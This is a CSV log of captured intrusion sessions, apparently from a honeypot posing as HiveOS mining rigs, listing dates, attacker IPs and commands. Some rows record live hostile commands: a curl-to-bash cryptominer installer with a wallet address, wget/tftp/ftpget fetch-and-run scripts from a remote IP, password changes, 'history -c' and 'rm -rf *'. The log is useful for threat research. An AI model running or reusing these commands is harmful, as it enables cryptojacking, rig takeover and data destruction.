attackdate,attackerip,entrancetime,exittime,commands
2021-11-19,10.0.3.241,15:28:53.055,15:29:55.129,['scp -t /tmp/HQWRz6ft']
2021-11-16,10.0.3.215,15:42:49.718,16:00:01.693,"['sudo hive-passwd salutlume123', 'sudo pkill Xorg']"
2021-11-17,10.0.3.139,15:55:24.664,15:55:26.625,[]
2021-11-27,10.0.3.200,15:54:46.216,15:58:59.506,['scp -t /tmp/wFGDQ6L6']
2021-11-16,10.0.3.68,16:08:59.804,16:09:00.606,"['sudo hive-passwd c3Rvcnl0aW1lIGRheW9uZSBhbmQgZGF5dHdevbase64', 'sudo pkill Xorg', 'sudo pkill x11vnc']"
2021-11-17,10.0.3.130,16:13:18.072,16:29:56.819,"['sudo hive-passwd f5123', 'sudo pkill Xorg', 'sudo pkill x11vnc']"
2021-11-18,10.0.3.142,16:40:35.426,16:41:07.214,['scp -t -- /tmp/M4R6HQTO']
2021-11-20,10.0.3.67,16:52:45.278,17:00:01.962,[]
2021-11-17,10.0.3.217,17:22:43.597,17:22:46.446,"['sudo hive-passwd Tmlrb2xhaV9QdXBhbm92X01vamVfRGFfR29fUG9sYXBh_base64', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
2021-11-16,10.0.3.243,17:38:23.240,17:58:16.261,"[""uname -a;lspci | grep -i --color 'vga\\|3d\\|2d';curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 4AXp4BAFuqCUNLJ3X12FKg7jp9MQjiMeWG1bMme9znFNPvhP2LqGXUF5pEfaeMQ7FAArXVWnUAEEMF2Kms6xzjMGVagomWr""]"
2021-11-17,10.0.3.189,17:41:13.468,17:41:16.779,"['sudo hive-passwd Tmlrb2xhaV9QdXBhbm92X01vamVfRGFfR29fUG9sYXBh_base64', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
2021-11-25,10.0.3.47,17:57:11.159,17:57:44.220,[]
2021-11-16,10.0.3.222,18:04:50.150,18:29:49.942,"['sudo hive-passwd dS5mdWNraW4udHJpZWQubmlnZ2E', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c', 'cat /hive-config/rig.conf']"
2021-11-17,10.0.3.137,18:16:21.241,18:19:48.163,['uname -s -v -n -r -m']
2021-11-15,10.0.3.142,18:50:51.308,18:58:30.154,"['sudo hive-passwd f5123', 'sudo pkill Xorg', 'sudo pkill x11vnc']"
2021-11-16,10.0.3.207,18:41:08.335,18:55:01.558,"[""uname -a;lspci | grep -i --color 'vga\\|3d\\|2d';curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 4AXp4BAFuqCUNLJ3X12FKg7jp9MQjiMeWG1bMme9znFNPvhP2LqGXUF5pEfaeMQ7FAArXVWnUAEEMF2Kms6xzjMGVagomWr""]"
2021-11-17,10.0.3.135,18:57:28.542,19:00:01.217,['uname -s -v -n -r -m']
2021-11-18,10.0.3.193,18:53:17.247,18:57:27.289,['/ip cloud print']
2021-11-21,10.0.3.221,18:42:37.138,18:58:51.295,"['cd /tmp || cd /var/run || cd /mnt || cd /root || cd /', 'wget http://54.37.79.0/0x83911d24Fx.sh', 'curl -O http://54.37.79.0/0x83911d24Fx.sh', 'chmod 777 0x83911d24Fx.sh', 'sh 0x83911d24Fx.sh', 'tftp 54.37.79.0  -c get 0xt984767.sh', 'chmod 777 0xft6426467.sh', 'sh 0xft6426467.sh', 'tftp -r 0xtf2984767.sh -g 54.37.79.0 ', 'chmod 777 0xtf2984767.sh', 'sh 0xtf2984767.sh', 'ftpget -v -u anonymous -p anonymous -P 21 54.37.79.0  0xft6426467.sh 0xft6426467.sh', 'sh 0xft6426467.sh', 'rm -rf 0xt984767.sh 0xtf2984767.sh 0xft6426467.sh', 'rm -rf *']"
2021-11-22,10.0.3.246,18:46:53.890,18:49:05.506,['uname -s -v -n -r -m']
